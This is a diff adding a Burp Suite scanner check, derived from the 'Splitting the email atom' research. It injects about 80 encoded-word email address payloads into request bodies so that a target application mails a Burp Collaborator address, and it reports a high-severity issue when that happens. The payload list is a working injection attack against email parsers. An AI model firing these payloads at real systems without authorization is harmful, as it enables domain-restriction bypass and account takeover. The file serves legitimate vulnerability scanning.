@@ -1,0 +1,113 @@
+# Derived from the research 'Splitting the email atom' by Gareth Heyes.
+# https://portswigger.net/research/splitting-the-email-atom
+
+metadata:
+    language: v2-beta
+    name: "Email splitting attack"
+    author: "Peter Wiener"
+    tags: "active", "email"
+
+define:
+    # construct the collaborator email address, which we will try and trick
+    # the target into sending an email to, rather than the actual host
+    collaborator_address = {generate_collaborator_address()}
+    collaborator_payload = {regex_replace({collaborator_address}, "\.(.*)", "")}
+    collaborator_host = {regex_replace({collaborator_address}, "^[^.]+\.", "")}
+
+    # the host which we actually point the email at, change as appropriate
+    target_host = {base.request.url.host}
+
+run for each:
+    payload =
+        "=?iso-8859-1?q?{payload]=40{url}=3e=00?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=01?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=02?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=03?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=04?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=05?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=07?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=08?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=0e?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=0f?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=10?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=11?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=13?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=15?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=16?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=17?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=19?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=1a?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=1b?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=1c?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=1d?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=1f?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=20?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=2c?=x@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=00?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=01?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=02?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=03?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=04?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=05?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=07?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=08?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=0e?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=0f?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=10?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=11?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=13?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=15?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=16?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=17?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=19?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=1a?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=1b?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=1c?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=1d?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=1f?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=3e=20?=foo@{target_host}",
+        "=?utf-8?q?{payload}=40{url}=2c?=x@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=00?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=01?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=02?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=03?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=04?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=05?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=07?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=08?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=0e?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=0f?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=10?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=11?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=13?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=15?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=16?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=17?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=19?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=1a?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=1b?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=1c?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=1d?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=1f?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=3e=20?=foo@{target_host}",
+        "=?x?q?{payload}=40{url}=2c?=x@{target_host}",
+        "=?utf-7?q?{payload}&AEA-{url}&ACw-?=x@{target_host}",
+        "=?utf-7?q?{payload}&AEA-{url}&ACw=/xyz!-?=x@{target_host}",
+        "=?utf-7?q?{payload}=26AEA-{url}=26ACw-?=x@{target_host}",
+        "=?utf-7?q?{payload}&AEA-{url}&ACA-?=@{target_host}",
+        "{payload}=?utf-7?b?JkFFQS0?={url}=?utf7?b?JkFDdy0?=x@{target_host}",
+        "{payload}=?x?b?QA==?={url}=?x?b?LA==?=x@{target_host}",
+        "{payload}@xn--style-321.{url}",
+        "foo@xn--x-0314.xn--0026.xn--0193.xn--54_52932"
+
+given body insertion point then
+    send payload:
+        replacing: {regex_replace(regex_replace(regex_replace({payload}, "\{target_host}", {target_host}), "\{payload}", {collaborator_payload}), "\{url}", {collaborator_host})}
+
+    if smtp interactions then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: `The target application was tricked into sending an email to a Burp Collaborator address, despite the actual email pointing at '{target_host}'`
+            remediation: "Ensure that your email parsing logic on the server is improved. Read more at: https://portswigger.net/research/splitting-the-email-atom"
+    end if
